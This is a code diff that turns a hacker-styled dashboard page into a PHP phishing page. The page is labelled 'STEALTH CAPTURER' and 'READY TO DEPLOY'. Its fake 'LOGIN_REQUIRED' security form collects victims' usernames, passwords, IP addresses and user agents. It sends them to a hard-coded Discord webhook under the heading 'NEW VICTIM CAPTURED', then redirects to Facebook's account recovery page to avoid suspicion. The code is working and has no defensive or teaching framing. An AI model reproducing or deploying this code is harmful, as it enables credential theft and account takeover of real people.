@@ -1,99 +1,86 @@
+<?php
+/* PACKET: STEALTH CAPTURER V1
+   STATUS: READY TO DEPLOY
+*/
+
+// URL WEBHOOK LO SUDAH TERPASANG
+$webhook_url = "https://discord.com/api/webhooks/1492149711023640656/a0gx_rp4_iz6JYnvdZbO__D_OtLZQoIeR_xT7VQF_3_7rWGU2p5ztKwBSWebes-O7JzR";
+
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    $user = $_POST['u'];
+    $pass = $_POST['p'];
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $ua = $_SERVER['HTTP_USER_AGENT'];
+
+    // Format pesan untuk Discord
+    $message = "
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔥 **NEW VICTIM CAPTURED** 🔥
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+👤 **Username :** `$user`
+🔑 **Password :** `$pass`
+🌐 **IP Target:** `$ip`
+📱 **Device  :** `$ua`
+━━━━━━━━━━━━━━━━━━━━━━━━━━";
+
+    $data = array('content' => $message);
+    $options = array(
+        'http' => array(
+            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
+            'method'  => 'POST',
+            'content' => http_build_query($data),
+        ),
+    );
+    $context  = stream_context_create($options);
+    file_get_contents($webhook_url, false, $context);
+
+    // Lempar target ke halaman asli (misal: Facebook) biar gak curiga
+    header("Location: https://www.facebook.com/recover/gatekeeper");
+    exit();
+}
+?>
+
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>XREXZOB // FORENSIC_NODE</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Autentikasi Keamanan</title>
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        :root { --neon: #00ffff; --blood: #ff0000; --bg: #020202; }
-        body { background: var(--bg); color: var(--neon); font-family: 'Consolas', monospace; margin: 0; padding: 20px; font-size: 12px; line-height: 1.2; overflow: hidden; }
-        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; height: 95vh; }
-        .panel { border: 1px solid #1a1a1a; padding: 15px; position: relative; background: rgba(5,5,5,0.8); }
-        .panel:hover { border-color: var(--neon); box-shadow: 0 0 10px rgba(0,255,255,0.1); }
-        .header { color: var(--blood); font-weight: bold; margin-bottom: 10px; border-bottom: 1px solid var(--blood); padding-bottom: 5px; text-transform: uppercase; }
-        .data-row { display: flex; justify-content: space-between; margin-bottom: 4px; border-bottom: 1px solid #111; }
-        .val { color: #fff; }
-        #log-box { font-size: 10px; color: #444; overflow: hidden; height: 150px; }
-        .scanner { width: 100%; height: 2px; background: var(--neon); position: absolute; top: 0; left: 0; animation: scan 3s linear infinite; opacity: 0.3; }
-        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
-        canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.1; }
+        body { background: #000; font-family: 'Courier New', monospace; color: #00ff41; }
+        .glow-box { border: 1px solid #1a1a1a; background: #080808; box-shadow: 0 0 15px rgba(0,255,65,0.1); }
+        input { background: #111 !important; border: 1px solid #222 !important; color: #fff !important; }
+        input:focus { border-color: #00ff41 !important; }
     </style>
 </head>
-<body>
+<body class="flex items-center justify-center min-h-screen p-6">
 
-<canvas id="matrix"></canvas>
+    <div class="glow-box max-w-sm w-full p-8 rounded-lg border-t-2 border-green-600">
+        <div class="text-center mb-6">
+            <h1 class="text-xl font-bold tracking-tighter text-white">LOGIN_REQUIRED</h1>
+            <p class="text-[9px] text-green-800 mt-1 italic">SECURITY PROTOCOL v4.0.1 ACTIVE</p>
+        </div>
 
-<div class="grid">
-    <div class="panel">
-        <div class="scanner"></div>
-        <div class="header">TARGET_INTEL (YOU)</div>
-        <div class="data-row"><span>PUBLIC_IP:</span> <span class="val" id="ip">FETCHING...</span></div>
-        <div class="data-row"><span>BROWSER:</span> <span class="val" id="brw">...</span></div>
-        <div class="data-row"><span>PLATFORM:</span> <span class="val" id="plt">...</span></div>
-        <div class="data-row"><span>CORES:</span> <span class="val" id="cor">...</span></div>
-        <div class="data-row"><span>MEMORY:</span> <span class="val" id="mem">~...GB</span></div>
-        <div class="data-row"><span>LANGUAGE:</span> <span class="val" id="lng">...</span></div>
+        <form method="POST" class="space-y-4">
+            <div>
+                <label class="text-[10px] text-green-700 uppercase">Identity / Email</label>
+                <input type="text" name="u" required class="w-full p-2 text-sm outline-none transition">
+            </div>
+            <div>
+                <label class="text-[10px] text-green-700 uppercase">Access Password</label>
+                <input type="password" name="p" required class="w-full p-2 text-sm outline-none transition">
+            </div>
+            <button type="submit" class="w-full bg-green-600 hover:bg-green-500 text-black font-black py-2 mt-4 transition duration-300">
+                VERIFY_ACCESS
+            </button>
+        </form>
+
+        <div class="mt-8 flex justify-between items-end opacity-30 text-[8px]">
+            <span>NODE: ID_SOUTH_01</span>
+            <span>ENCRYPTION: AES-256</span>
+        </div>
     </div>
 
-    <div class="panel" style="grid-row: span 2;">
-        <div class="header" style="color: var(--neon); border-color: var(--neon);">XREXZOB // MAIN_FRAME</div>
-        <p style="color: #fff; font-size: 14px;">Welcome to the Abyss, XREXZOB.</p>
-        <p>Web ini adalah node pengintaian pribadi. Gunakan untuk monitoring koneksi dan identitas device.</p>
-        
-        <div class="header" style="margin-top: 30px;">ACTIVE_REPOS</div>
-        <div class="data-row"><a href="#" style="color:var(--neon)">> REPO_ALPHA</a> <span class="val">[ONLINE]</span></div>
-        <div class="data-row"><a href="#" style="color:var(--neon)">> REPO_BETA</a> <span class="val">[ENCRYPTED]</span></div>
-        <div class="data-row"><a href="#" style="color:var(--neon)">> SHADOW_API</a> <span class="val">[STABLE]</span></div>
-
-        <div id="log-box" style="margin-top: 50px;"></div>
-    </div>
-
-    <div class="panel">
-        <div class="header">NETWORK_DIAGNOSTIC</div>
-        <div class="data-row"><span>LATENCY:</span> <span class="val" id="lat">0ms</span></div>
-        <div class="data-row"><span>STATUS:</span> <span class="val" id="stt">STABLE</span></div>
-        <div class="data-row"><span>UPTIME:</span> <span class="val" id="upt">00:00:00</span></div>
-    </div>
-</div>
-
-<script>
-    // System Data
-    document.getElementById('brw').innerText = navigator.userAgent.split(' ')[0];
-    document.getElementById('plt').innerText = navigator.platform;
-    document.getElementById('cor').innerText = navigator.hardwareConcurrency + " THREADS";
-    document.getElementById('mem').innerText = (navigator.deviceMemory || '4+') + "GB";
-    document.getElementById('lng').innerText = navigator.language.toUpperCase();
-
-    fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => {
-        document.getElementById('ip').innerText = d.ip;
-    });
-
-    // Latency Monitor
-    setInterval(() => {
-        const start = Date.now();
-        fetch('https://www.google.com/favicon.ico', {mode: 'no-cors'}).then(() => {
-            document.getElementById('lat').innerText = (Date.now() - start) + "ms";
-        });
-    }, 5000);
-
-    // Uptime
-    let s = 0;
-    setInterval(() => {
-        s++;
-        let h = Math.floor(s/3600).toString().padStart(2,'0');
-        let m = Math.floor((s%3600)/60).toString().padStart(2,'0');
-        let sec = (s%60).toString().padStart(2,'0');
-        document.getElementById('upt').innerText = `${h}:${m}:${sec}`;
-    }, 1000);
-
-    // Random Logs
-    const logBox = document.getElementById('log-box');
-    const logs = ["Packet sniffed", "Port 8080 open", "Handshake success", "Encrypting layer 7", "Bypassing firewall", "Identity hidden"];
-    setInterval(() => {
-        const d = document.createElement('div');
-        d.innerText = `[${new Date().toLocaleTimeString()}] > ${logs[Math.floor(Math.random()*logs.length)]}`;
-        logBox.prepend(d);
-        if(logBox.childNodes.length > 8) logBox.removeChild(logBox.lastChild);
-    }, 2000);
-</script>
 </body>
 </html>
